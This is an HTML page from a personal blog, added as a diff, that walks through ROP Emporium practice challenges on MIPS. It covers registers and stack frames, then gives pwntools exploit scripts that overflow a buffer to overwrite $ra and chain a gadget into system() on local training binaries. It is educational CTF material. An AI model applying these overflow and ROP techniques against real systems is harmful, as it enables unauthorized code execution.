@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Static">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/23/异架构pwn学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="MIPS &amp; ARM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="异架构ROPemporium学习">
+<meta property="og:url" content="http://example.com/2024/01/23/%E5%BC%82%E6%9E%B6%E6%9E%84pwn%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MIPS &amp; ARM">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-01-23T07:52:19.996Z">
+<meta property="article:modified_time" content="2023-08-08T10:51:14.133Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="异架构">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/cat-96.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            异架构ROPemporium学习 -
+        
+        Static&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Static&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/chuyin1.jpg","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/cat-96.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Static&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">异架构ROPemporium学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/OIP-C.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Static</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-23 15:52:19</span>
+        <span class="mobile">2024-01-23 15:52:19</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-08-08 18:51:14</span>
+            <span class="mobile">2023-08-08 18:51:14</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E5%BC%82%E6%9E%B6%E6%9E%84/">异架构</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%BC%82%E6%9E%B6%E6%9E%84/">异架构</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h3 id="mips寄存器及函数调用前置知识"><a href="#mips寄存器及函数调用前置知识" class="headerlink" title="mips寄存器及函数调用前置知识"></a>mips寄存器及函数调用前置知识</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><table>
+<thead>
+<tr>
+<th align="left">编号</th>
+<th align="left">寄存器名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">$0</td>
+<td align="left">$zero</td>
+<td align="left">第0号寄存器，其值始终为0</td>
+</tr>
+<tr>
+<td align="left">$1</td>
+<td align="left">$at</td>
+<td align="left">保留寄存器</td>
+</tr>
+<tr>
+<td align="left">$2-$3</td>
+<td align="left">$v0-$v1</td>
+<td align="left">values，保存表达式或函数返回结果</td>
+</tr>
+<tr>
+<td align="left">$4-$7</td>
+<td align="left">$a0-$a3</td>
+<td align="left">argument，作为函数的前四个参数</td>
+</tr>
+<tr>
+<td align="left">$8-$15</td>
+<td align="left">$t0-$t7</td>
+<td align="left">temporaries，供汇编程序使用的临时寄存器</td>
+</tr>
+<tr>
+<td align="left">$16-$23</td>
+<td align="left">$s0-$s7</td>
+<td align="left">saved values，子函数使用时需先保存原寄存器的值</td>
+</tr>
+<tr>
+<td align="left">$24-$25</td>
+<td align="left">$t8-$t9</td>
+<td align="left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7</td>
+</tr>
+<tr>
+<td align="left">$26-$27</td>
+<td align="left">$k0-$k1</td>
+<td align="left">保留，中断处理函数使用</td>
+</tr>
+<tr>
+<td align="left">$28</td>
+<td align="left">$gp</td>
+<td align="left">global pointer，全局指针</td>
+</tr>
+<tr>
+<td align="left">$29</td>
+<td align="left">$sp</td>
+<td align="left">stack pointer，堆栈指针，指向堆栈的栈顶</td>
+</tr>
+<tr>
+<td align="left">$30</td>
+<td align="left">$fp</td>
+<td align="left">frame pointer，保存栈指针</td>
+</tr>
+<tr>
+<td align="left">$31</td>
+<td align="left">$ra</td>
+<td align="left">return address，返回地址</td>
+</tr>
+</tbody></table>
+<h4 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h4><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>格式</strong></th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lw</td>
+<td>lw R1, 0(R2)</td>
+<td>从存储器读取一个 word 加载 (load) 到 register 中</td>
+</tr>
+<tr>
+<td>sw</td>
+<td>sw R1, 0(R2)</td>
+<td>把一个 word 从 register 中存储 (store) 到存储器中</td>
+</tr>
+<tr>
+<td>addiu</td>
+<td>addiu R1, R2, #3</td>
+<td>把一个立即数 #3 加上 R2 内容之后存放到 R1 中</td>
+</tr>
+<tr>
+<td>or</td>
+<td>or R1, R2, R3</td>
+<td>两个寄存器内容相或，并存储到 R1 中</td>
+</tr>
+<tr>
+<td>jalr</td>
+<td>jalr R1</td>
+<td>使用寄存器的跳转指令</td>
+</tr>
+</tbody></table>
+<h4 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h4><p>在调用一个函数时，首先会将函数调用的参数依次放在寄存器<code>$a0 $a1 $a2 $a3</code>中，剩余放在栈中。然后会使用<code>jal target</code>跳转，先将返回地址存入<code>$ra</code>中，然后才会进入target函数。如果目标函数是叶子函数，则不会对<code>$ra</code>进行处理，如果是非叶子函数，则会将<code>$ra</code>的值存入栈中，方便恢复（这时我们就可以进行溢出来劫持控制流了）。然后会将上一个函数的栈帧<code>$fp</code>存入栈中。剩余空间会存放该函数的局部变量。</p>
+<p>叶子函数就是该函数不会再调用其他函数，非叶子函数则会调用其他函数。</p>
+<p>example:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004008B0 3D 02 10 0C                   jal     pwnme</span><br><span class="line">...</span><br><span class="line">.text:004008F4                                # int pwnme()</span><br><span class="line">.text:004008F4                               pwnme:                                   # CODE XREF: main+80↑p</span><br><span class="line">.text:004008F4</span><br><span class="line">.text:004008F4                               var_28= -0x28</span><br><span class="line">.text:004008F4                               var_20= -0x20</span><br><span class="line">.text:004008F4                               var_s0=  0</span><br><span class="line">.text:004008F4                               var_s4=  4</span><br><span class="line">.text:004008F4</span><br><span class="line">.text:004008F4 C0 FF BD 27                   addiu   $sp, -0x40</span><br><span class="line">.text:004008F8 3C 00 BF AF                   sw      $ra, 0x38+var_s4($sp)</span><br><span class="line">.text:004008FC 38 00 BE AF                   sw      $fp, 0x38+var_s0($sp)</span><br><span class="line">.text:00400900 25 F0 A0 03                   move    $fp, $sp</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="cpu流水线"><a href="#cpu流水线" class="headerlink" title="cpu流水线"></a>cpu流水线</h4><p>MIPS采用了高度的流水线，其中一个重要的效应时分支延迟效应。在MIPS程序中，最常见的就是平衡栈的语句，它一般会出现在跳转语句之后，但是在跳转执行之后，目标位置代码执行以前，栈平衡的这个语句就已经执行完毕了，实现了栈平衡（所以看似它并不会执行，但事实上它会执行）。示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:004009C0                               loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class="line">.text:004009C0 34 00 BF 8F                   lw      $ra, 0x1C+var_s18($sp)</span><br><span class="line">.text:004009C4 30 00 B5 8F                   lw      $s5, 0x1C+var_s14($sp)</span><br><span class="line">.text:004009C8 2C 00 B4 8F                   lw      $s4, 0x1C+var_s10($sp)</span><br><span class="line">.text:004009CC 28 00 B3 8F                   lw      $s3, 0x1C+var_sC($sp)</span><br><span class="line">.text:004009D0 24 00 B2 8F                   lw      $s2, 0x1C+var_s8($sp)</span><br><span class="line">.text:004009D4 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class="line">.text:004009D8 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)</span><br><span class="line">.text:004009DC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:004009E0 38 00 BD 27                   addiu   $sp, 0x38			##########</span><br></pre></td></tr></table></figure></div>
+
+<p>关于流水线的具体设计以及细节原理，可自行查找资料。</p>
+<h3 id="mips运行调试环境搭建"><a href="#mips运行调试环境搭建" class="headerlink" title="mips运行调试环境搭建"></a>mips运行调试环境搭建</h3><p>关于环境搭建已有很多文章作出了回答，例如：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38722334/article/details/109842394" >利用QEMU+GDB在ubuntu系统中配置MIPS调试运行环境_ubuntu mips运行_小魏今天不摸鱼的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p>简单的ret2text，程序中有溢出和后门，因为pwnme是非叶子函数，因此<code>$ra</code>会保存在栈中，覆盖其到后门即可</p>
+<p>关于要覆盖多少字节，可以直接看IDA</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu   $sp, -0x40</span><br></pre></td></tr></table></figure></div>
+
+<p>由上述汇编可以看到栈被抬升了0x40，而<code>  char v1[32]; // [sp+18h] [+18h] BYREF</code>，则栈结构如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sp   -&gt;    ----------</span><br><span class="line">		  |          |</span><br><span class="line">$sp+18h -&gt;  ----------</span><br><span class="line">           |  v1[32]  |</span><br><span class="line">            ----------</span><br><span class="line">           |   $fp    |</span><br><span class="line">            ----------</span><br><span class="line">           |   $ra    |</span><br><span class="line">$sp+40h -&gt;  ----------</span><br></pre></td></tr></table></figure></div>
+
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>, <span class="string">&#x27;./ret2win_mipsel&#x27;</span>])</span><br><span class="line"><span class="comment">#io = process(&#x27;./ret2win_mipsel&#x27;)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400a00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span>+p32(backdoor)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>简单的ROP，多了个传参的过程，IDA打开可以看到有一个函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后再转成汇编看，可以发现给了一个有用的gadgets，正好可以用来传参</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A20                               usefulGadgets:</span><br><span class="line">.text:00400A20 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:00400A24 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400A28 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400A2C 00 00 00 00                   nop</span><br></pre></td></tr></table></figure></div>
+
+<p>因此就非常简单了，直接先传参后调用system就行了</p>
+<p>exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;12345&quot;</span>, <span class="string">&quot;./split_mipsel&quot;</span>])</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x400b70</span></span><br><span class="line">flag = <span class="number">0x411010</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00400a20 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span> + p32(<span class="number">0x400a20</span>) + p32(<span class="number">0</span>) + p32(system) + p32(flag)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>一条比较完整的ROP链，需要保证可以连续调用函数和传参，IDA打开看到溢出和后门函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>同样的，也有有用的gadgets</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00400BB0                               usefulGadgets:</span><br><span class="line">.text:00400BB0 10 00 A4 8F                   lw      $a0, 0x10($sp)</span><br><span class="line">.text:00400BB4 0C 00 A5 8F                   lw      $a1, 0xC($sp)</span><br><span class="line">.text:00400BB8 08 00 A6 8F                   lw      $a2, 8($sp)</span><br><span class="line">.text:00400BBC 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:00400BC0 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400BC4 00 00 00 00                   nop</span><br><span class="line">.text:00400BC4</span><br><span class="line">.text:00400BC8 14 00 BF 8F                   lw      $ra, 0x14($sp)</span><br><span class="line">.text:00400BCC 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00400BD0 18 00 BD 23                   addi    $sp, 0x18</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们可以发现<code>callme_three() callme_two() callme_one()</code>这三个函数需要传参<code>$a0=0xdeadbeef  $a1=0xcafebabe  $a2=0xd00df00d</code>才能正确拿到flag，并且需要按照顺序依次调用</p>
